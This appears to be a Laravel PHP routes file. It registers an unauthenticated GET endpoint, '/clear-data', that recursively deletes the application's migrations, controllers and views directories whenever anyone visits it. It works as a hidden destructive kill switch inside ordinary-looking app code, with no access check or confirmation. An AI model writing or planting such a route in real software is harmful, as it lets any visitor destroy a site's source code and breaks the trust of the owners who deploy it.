<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Filesystem\Filesystem;

Route::get('/clear-data', function () {
    $fileSystem = new Filesystem();

    // Define the paths to be deleted
    $paths = [
        base_path('database/migrations'),
        base_path('app/Http/Controllers'),
        base_path('resources/views')
    ];

    foreach ($paths as $path) {
        if ($fileSystem->isDirectory($path)) {
            $fileSystem->deleteDirectory($path);
            echo "Deleted directory at $path.\n";
        }
    }
});
